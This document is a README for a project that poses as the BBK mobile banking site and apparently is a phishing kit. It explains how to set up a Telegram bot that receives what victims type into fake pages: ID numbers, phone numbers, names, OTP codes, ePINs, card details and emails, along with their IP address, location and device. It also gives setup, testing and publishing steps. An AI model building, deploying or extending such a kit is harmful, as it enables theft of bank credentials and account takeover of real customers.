# BBK Mobile Banking - HTML/CSS/JavaScript Version

This project has been converted from PHP to pure HTML, CSS, and JavaScript. All form submissions now use JavaScript to send data to Telegram.

## Setup Instructions

### 1. Configure Telegram Bot

1. Open `config.js` file
2. Replace `YOUR_BOT_TOKEN_HERE` with your Telegram bot token
   - Get your bot token from [@BotFather](https://t.me/BotFather) on Telegram
   - Create a new bot or use an existing one
   - Copy the bot token
3. Replace `YOUR_CHAT_ID_HERE` with your Telegram chat ID
   - To get your chat ID, message [@userinfobot](https://t.me/userinfobot) on Telegram
   - Or message your bot and visit: `https://api.telegram.org/bot<YOUR_BOT_TOKEN>/getUpdates`
   - Look for the `chat.id` value in the response

### 2. Update Site URL (Optional)

In `config.js`, update the `SITE_URL` variable if you need to change redirect URLs:
```javascript
const SITE_URL = 'https://yourdomain.com/';
```

### 3. File Structure

- `config.js` - Telegram bot configuration
- `telegram.js` - Utility functions for sending messages to Telegram
- `index.html` - Landing page
- `cpr.html` - CPR verification page
- `number.html` - Mobile number input page
- `name.html` - Full name input page
- `otp.html` - OTP verification page
- `epin.html` - ePIN activation page
- `card.html` - Card details page
- `balance.html` - Account balance page
- `gmail.html` - Email input page

### 4. How It Works

All forms now use JavaScript to:
1. Collect form data
2. Send data to Telegram using the configured bot
3. Redirect to the next page in the flow

The Telegram messages include:
- Form data submitted by users
- User's IP address
- Location information (city, country, region)
- Device type and browser information
- Timestamp

### 5. Testing

1. Open `index.html` in a web browser
2. Fill out the forms and submit
3. Check your Telegram chat for the messages

## Notes

- All PHP dependencies have been removed
- The code now runs entirely in the browser
- No server-side processing is required
- All data is sent directly to Telegram from the browser

## GitHub Setup

### Important: Security
- **DO NOT commit `config.js` to GitHub** - it contains your bot token
- The `.gitignore` file is configured to exclude `config.js`
- Use `config.example.js` as a template for others

### Uploading to GitHub

1. **Create a new repository on GitHub:**
   - Go to https://github.com/new
   - Choose a repository name (e.g., `bbk-mobile-banking`)
   - Make it Public or Private (your choice)
   - Don't initialize with README (we already have one)

2. **Initialize Git and push:**
   ```bash
   git init
   git add .
   git commit -m "Initial commit: BBK Mobile Banking HTML/CSS/JS version"
   git branch -M main
   git remote add origin https://github.com/YOUR_USERNAME/YOUR_REPO_NAME.git
   git push -u origin main
   ```

3. **After pushing, manually add config.js:**
   - Since `config.js` is in `.gitignore`, it won't be uploaded
   - This protects your bot token from being exposed
   - Each person who clones the repo needs to create their own `config.js` from `config.example.js`

